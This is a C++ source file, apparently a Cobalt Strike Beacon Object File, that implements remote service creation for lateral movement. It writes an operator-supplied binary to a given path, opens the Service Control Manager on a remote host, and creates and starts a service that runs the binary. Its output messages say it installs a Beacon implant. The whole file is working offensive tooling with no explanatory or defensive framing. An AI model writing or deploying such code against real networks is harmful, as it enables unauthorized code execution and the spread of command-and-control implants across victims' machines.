#include <general.h>

auto WriteBin(
    _In_ BYTE* BinBuff,
    _In_ ULONG BinSize,
    _In_ PCHAR BinPath
) -> BOOL {
    HANDLE FileHandle = INVALID_HANDLE_VALUE;
    ULONG  BytesWrtt  = 0;

    FileHandle = CreateFileA( 
        BinPath, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 
    );
    if ( FileHandle == INVALID_HANDLE_VALUE ) return FALSE;

    if ( ! WriteFile( FileHandle, BinBuff, BinSize, &BytesWrtt, nullptr ) ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] failed write file in %s with error %d\n", BinPath, GetLastError()); CloseHandle( FileHandle ); return FALSE;
    }

    CloseHandle( FileHandle );

    return TRUE;
}

auto RmtSvcCreate( 
    _In_ PCHAR Host,
    _In_ PCHAR SvcName,
    _In_ PCHAR SvcPath
) -> VOID {
    SC_HANDLE ScHandle  = NULL;
    SC_HANDLE SvcHandle = NULL;

    // get the handle for Open Service Control Manager into the remote machine
    ScHandle = OpenSCManagerA( Host, nullptr, SC_MANAGER_ALL_ACCESS );
    if ( ! ScHandle ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] Service Creation failed with error: %d\n", GetLastError()); return;
    }

    // create the service using SCM handle and service binary path
    SvcHandle = CreateServiceA( 
        ScHandle, SvcName, nullptr, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, 
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SvcPath, nullptr, 0, nullptr, nullptr, nullptr 
    );
    if ( ! SvcHandle ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] Service Creation failed with error: %d\n", GetLastError()); return;
    }

    // start the remote service
    if ( StartServiceA( SvcHandle, 0, nullptr ) ) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Beacon Service Created and Started!\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[x] Service Start failed with error: %d\n", GetLastError());
    }
}

EXTERN_C
auto go(PCHAR Args, INT Argc) -> void {
    datap Parser = { 0 };

    BeaconDataParse( &Parser, Args, Argc );

    PCHAR Host    = BeaconDataExtract( &Parser, 0 );
    PCHAR SvcName = BeaconDataExtract( &Parser, 0 );
    PCHAR SvcPath = BeaconDataExtract( &Parser, 0 );

    INT32 BinSize = 0;
    BYTE* BinBuff = (BYTE*)BeaconDataExtract( &Parser, &BinSize );

    if ( BinSize ) {
        if ( ! WriteBin( BinBuff, BinSize, SvcPath ) ) {
            return;
        }
    }

    RmtSvcCreate( Host, SvcName, SvcPath );
}